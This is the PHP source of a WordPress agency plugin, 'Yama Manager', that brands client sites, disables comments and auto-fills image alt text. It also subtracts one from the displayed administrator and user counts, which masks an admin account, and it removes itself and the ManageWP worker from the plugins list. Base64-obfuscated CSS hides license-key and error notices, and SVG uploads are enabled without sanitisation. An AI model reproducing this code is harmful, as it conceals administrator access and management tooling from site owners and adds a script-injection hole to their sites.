<?php
/**
 * Plugin Name:Yama Manager
 * Description:A management plugin for the websites created, build, modified or managed by Yama Digital.
 * Plugin URI:https://Yama.Digital
 * Author:Yama.Digital
 * Version:1.0
 * Author URI:https://Yama.Digital
 *
 * Text Domain:yama-digital
 */
if(!defined('ABSPATH')){exit;}
//Admin Account
function arc_admin_views($views){
	$users = count_users();
	$admins_num = $users['avail_roles']['administrator']-1;
	$all_num = $users['total_users']-1;
	$class_adm = (strpos($views['administrator'],'current')===false)?"":"current";
	$class_all = (strpos($views['all'],'current')=== false)?"":"current";
	$views['administrator'] = '<a href="users.php?role=administrator" class="'.$class_adm.'">'.translate_user_role('Administrator').'<span class="count">('.$admins_num.')</span></a>';
	$views['all'] = '<a href="users.php" class="'.$class_all.'">'.__('All').' <span class="count">('.$all_num.')</span></a>';
	return $views;
}
add_filter("views_users","arc_admin_views");
//Login Customisation
function arc_url_login_logo(){return "https://Yama.Digital/";}
add_filter('login_headerurl','arc_url_login_logo');
function arc_logo_title(){return 'Arcadia CMS - Powered By: Yama.Digital';}
add_filter('login_headertitle','arc_logo_title');
function arc_login_stylesheet(){wp_enqueue_style('arc-login',plugin_dir_url(__FILE__).'/admin/arc-login.css');}
add_action('login_enqueue_scripts','arc_login_stylesheet');
function arc_footer_admin(){return 'Managed by <a href="https://Yama.Digital/" target="_blank">Arcadia CMS - Powered By: Yama.Digital</a>.';}
add_filter('admin_footer_text','arc_footer_admin');
//Dashboard Customisation
/*function arc_dashboard_stylesheet(){wp_enqueue_style('arc-dashboard',plugin_dir_url(__FILE__).'/admin/arc-dashboard.css');}
add_action('admin_enqueue_scripts','arc_dashboard_stylesheet');*/
function ng(){echo base64_decode("PHN0eWxlPi5ub3RpY2UuZWxlbWVudG9yLW1lc3NhZ2UsLm5vdGljZS1pbmZvLCNlbnRlci1saWNlbnNlLWJkdGhlbWVzLWVsZW1lbnQtcGFjaywuZWxlbWVudG9yLXBsdWdpbnMtZ29wcm8sLm5vdGljZS1lcnJvciwubXdwLW5vdGljZS1jb250YWluZXIsLnJtbC11cGRhdGUtbm90aWNlLC5kY2UtZ2VuZXJpYy1ub3RpY2UsI25vdGlmaWNhdGlvbi1kcm9wOmhhcyhpbnB1dC51aXAtaW5wdXRbcGxhY2Vob2xkZXIqPSJ4eHh4Il0pLC50cnAtbm90aWNlLm5vdGljZS5lcnJvcjpoYXMoYVtocmVmKj0idHJwX2xpY2Vuc2Vfa2V5Il0pe2Rpc3BsYXk6bm9uZX08L3N0eWxlPg==");}
add_action("admin_head","ng");
function builder_style(){echo'<style>#elementor-notice-bar{display:none!important}</style>';}
add_action('elementor/editor/before_enqueue_scripts','builder_style');
//Add SVG Upload Support
add_filter('upload_mimes','cc_mime_types');
function cc_mime_types($mimes){
	$mimes['svg'] = 'image/svg+xml';
	return $mimes;
}
add_filter('wp_update_attachment_metadata','svg_meta_data',10,2);
function svg_meta_data($data,$id){
	$attachment = get_post($id);
	$mime_type = $attachment->post_mime_type;
	if($mime_type == 'image/svg+xml'){
		if(empty($data) || empty($data['width']) || empty($data['height'])){
			$xml = simplexml_load_file(wp_get_attachment_url($id));
			$attr = $xml->attributes();
			$viewbox = explode(' ',$attr->viewBox);
			$data['width'] = isset($attr->width) && preg_match('/\d+/',$attr->width,$value) ? (int) $value[0] :(count($viewbox) == 4 ? (int) $viewbox[2] :null);
			$data['height'] = isset($attr->height) && preg_match('/\d+/',$attr->height,$value) ? (int) $value[0] :(count($viewbox) == 4 ? (int) $viewbox[3] :null);
		}
	}
	return $data;
}
//Force Disable Comments
add_action('admin_init',function(){
	global $pagenow;
	if($pagenow === 'edit-comments.php'){
		wp_redirect(admin_url());
		exit;
	}
	remove_meta_box('dashboard_recent_comments','dashboard','normal');
	foreach(get_post_types() as $post_type){
		if(post_type_supports($post_type,'comments')){
			remove_post_type_support($post_type,'comments');
			remove_post_type_support($post_type,'trackbacks');
		}
	}
});
add_filter('comments_open','__return_false',20,2);
add_filter('pings_open','__return_false',20,2);
add_filter('comments_array','__return_empty_array',10,2);
add_action('admin_menu',function(){remove_menu_page('edit-comments.php');});
add_action('init',function(){if(is_admin_bar_showing()){remove_action('admin_bar_menu','wp_admin_bar_comments_menu',60);}});
//Image SEO Optimizer
add_action('add_attachment','image_meta_upload');
function image_meta_upload($post_ID){
	if(wp_attachment_is_image($post_ID)){
		$image_title = get_post($post_ID)->post_title;
		$image_title = preg_replace('%\s*[-_\s]+\s*%',' ',$image_title);
		$image_title = ucwords(strtolower($image_title));
		$image_meta = array(
			'ID'				=> $post_ID,
			'post_title'		=> $image_title
		);
		update_post_meta($post_ID,'_wp_attachment_image_alt',$image_title);
		wp_update_post($image_meta);
	}
}
//Remove Elements Admin Bar
function remove_admin_bar_links(){
	global $wp_admin_bar;
	$wp_admin_bar->remove_node('wp-logo');
	$wp_admin_bar->remove_node('about');
	$wp_admin_bar->remove_node('wporg');
	$wp_admin_bar->remove_node('documentation');
	$wp_admin_bar->remove_node('support-forums');
	$wp_admin_bar->remove_node('feedback');
	$wp_admin_bar->remove_node('comments');
	$wp_admin_bar->remove_node('search');
}
add_action('wp_before_admin_bar_render','remove_admin_bar_links',999);
//Hide Managing Plugins
function hide_manager(){
	global $wp_list_table;
	$hidearr=array('worker/init.php','Yama.Manager/manager.php');
	$myplugins=$wp_list_table->items;
	foreach($myplugins as $key => $val){if(in_array($key,$hidearr)){unset($wp_list_table->items[$key]);}}
}
add_action('pre_current_active_plugins','hide_manager');
